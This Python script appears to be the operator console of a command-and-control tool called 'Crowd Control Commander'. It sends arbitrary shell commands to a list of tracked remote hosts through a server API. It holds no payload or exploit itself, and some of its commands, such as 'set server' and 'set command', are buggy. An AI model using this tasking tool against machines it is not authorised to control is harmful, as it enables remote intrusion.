"""
This script will function as a CLI to push commands/targets to the web server
@author: degenerat3
"""

import requests 
import re

server = "http://127.0.0.1:80"


def welcome_msg():
    print("Welcome to Crowd Control Commander")
    print("Current server: " + server)
    print()
    print("Type 'help' for CLI options...")

def help_msg():
    print("Current server: " + server)
    print("To create new task:  `new task`")
    print("New task shortcut:   `t: host[ hosts...]: commands`")
    print("Set server IP:       `set server http://0.0.0.0:5000")
    print("To view hosts:       `show hosts`")
    print("To quit:             `exit`")


def parse_hosts(inp):
    arr = re.search('\[(.*)\]', inp).group(0)[1:-1]
    hosts = arr.split(",")
    return hosts


def parse_commands(inp):
    return re.search('"(.*)"', inp).group(0)[1:-1]


def task_help():
    print("To view hosts:       `show hosts`")
    print("To view task info:   `show task`")
    print("To add hosts:        `set host = [8.8.8.8]`")
    print("To add commands:     `set command = \"whoami\"`")
    print("To launch the task:  `launch`")
    print("To quit:             `exit`")
    return


def send_it(hosts, commands, srv):
    print("launching: " + commands)
    print("to: " + str(hosts))
    u = srv + "/api/commander/push" 
    hs = ""

    for h in hosts:
        hs += h + "|"
    hs = hs[:-1]
    jdata = {"hosts": hs, "commands": commands}
    r = requests.post(u, json=jdata)
    return

def new_task_loop(srv):
    hosts = ""
    commands = ""
    while True:
        inp = input('Commander(TASK)> ')
        if "set" in inp:
            if "host" in inp:
                hosts = parse_hosts(inp)
            elif "commands" in inp:
                commands = parse_commands(inp)
        elif "show" in inp:
            if inp == "show hosts":
                url = srv + "/api/commander/show"
                r = requests.get(url=url)
                block = r.text
                print("Tracked hosts:")
                print(block)
                print()
            elif "task" in inp or "TASK" in inp:
                print("TASK INFO: ")
                print("Host(s): " + str(hosts))
                print("Command(s): " + commands)
            else:
                print("Unknown command: " + inp)
        elif inp == "help":
            task_help()
        elif inp == "launch":
            if hosts == "":
                print("target hosts undefined...")
            elif commands == "":
                print("target commands undefined...")
            else:
                send_it(hosts, commands, srv)
                return
        elif inp == "exit":
            return
        else:
            print("Unknown command: " + inp)


def new_task(inp):
    # t: 8.8.8.8 8.8.8.8 8.8.8.8: echo hi
    try:
        _, ips, command = inp.split(":", 2)
        hosts = ips.replace(",","").strip().split()
        command = command.strip()
        print("Host(s): " + str(hosts))
        print("Command: " + command)
        send_it(hosts, command, server)
    except Exception as E:
        print(E)
        print("Error in format: 't: host[ hosts...]: commands'")

def big_loop(srv):
    while True:
        inp = input('Commander> ')
        if inp == "help":
            help_msg()
        if "show" in inp:
            url = srv + "/api/commander/show"
            r = requests.get(url=url)
            block = r.text
            if inp == "show hosts":
                print("Tracked hosts:")
                print(block)
                print()
            else:
                print("Unknown Command: " + inp)
        elif inp == "new task":
            new_task_loop(srv)
        elif inp[0:2] == "t:" and len(inp.split()) > 3:
            # We are doing a single line new task
            new_task(inp)
        elif inp.startswith("set server "):
            try:
                _, _, srv = inp.split()[2]
                global server
                server = srv
            except:
                pass
        elif inp == "exit":
            return
        else:
            print("Unknown command: " + inp)


def run():
    welcome_msg()
    s = server   
    big_loop(s)

run()